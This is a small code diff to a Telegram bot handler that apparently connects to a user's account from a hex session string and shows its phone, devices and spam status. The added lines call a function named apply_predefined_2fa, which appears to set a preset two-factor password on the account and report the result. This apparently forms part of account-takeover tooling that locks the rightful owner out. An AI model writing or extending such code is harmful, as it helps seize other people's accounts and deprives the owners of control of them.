@@ -168,12 +168,17 @@ async def receive_hex(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["current_phone"] = info.get("phone", "Unknown")
         context.user_data["current_name"] = name or "Unknown"
 
+        from handlers.predefined_2fa import apply_predefined_2fa
+        twofa_note = await apply_predefined_2fa(client, user_id)
+
         dash_text = format_account_info(info)
         dash_text += (
             f"├─ **Devices**  : {len(devices)} connected\n"
             f"├─ **Spam**     : {spam_status}\n"
             f"└─ **Status**   : ✅ **Verified & Connected**"
         )
+        if twofa_note:
+            dash_text += f"\n\n{twofa_note}"
 
         await status_msg.edit_text(
             dash_text,
